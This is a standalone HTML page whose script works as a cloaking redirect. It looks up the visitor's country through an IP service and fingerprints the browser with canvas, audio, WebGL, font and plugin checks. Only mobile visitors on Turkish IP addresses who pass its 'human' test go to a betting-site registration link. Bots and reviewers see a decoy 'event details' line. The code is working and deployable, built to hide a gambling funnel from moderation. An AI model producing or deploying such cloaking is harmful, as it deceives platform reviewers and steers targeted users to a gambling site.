<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Yönlendirme Kontrol</title>
</head>
<body>
  <h3 style="text-align:center;">Kontrol yapılıyor...</h3>

  <script>
    async function getIPCountry() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        console.log("Ülke kodu:", data.country_code);
        return data.country_code === "TR";
      } catch (e) {
        console.log("IP sorgusu xətası:", e);
        return false;
      }
    }

    async function checkAndRedirect() {
      const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
      const isTR = await getIPCountry();

      console.log("Mobil cihaz mı?:", isMobile);
      console.log("Türkiye IP mi?:", isTR);

      const result = {
        canvas: false,
        audio: false,
        webgl: false,
        fonts: 0,
        plugins: 0
      };

      try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.fillText("Test", 10, 10);
        const data = canvas.toDataURL();
        result.canvas = data.length > 100;
      } catch (e) {}

      try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = new AudioContext();
        result.audio = audioCtx.state === "running" || audioCtx.state === "suspended";
      } catch (e) {}

      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        result.webgl = !!gl;
      } catch (e) {}

      result.fonts = document.fonts ? document.fonts.size || 100 : 100;
      result.plugins = navigator.plugins.length;

      console.log("Fingerprint nəticələri:", result);

      const isHuman =
        result.canvas &&
        result.audio &&
        result.webgl &&
        result.fonts > 50 &&
        result.plugins > 0;

      console.log("İnsan profili mi?:", isHuman);

      if (isMobile && isTR && isHuman) {
        console.log("Yönlendirme başlatıldı ✅");
        window.location.href = "https://zbahis310.com/Register-1274";
      } else {
        console.log("Yönlendirme şərtləri ödənmədi ❌");
        document.body.innerHTML = "<h3>Etkinlik Detayları burada yer alacaktır.</h3>";
      }
    }

    setTimeout(checkAndRedirect, 2500);
  </script>
</body>
</html>
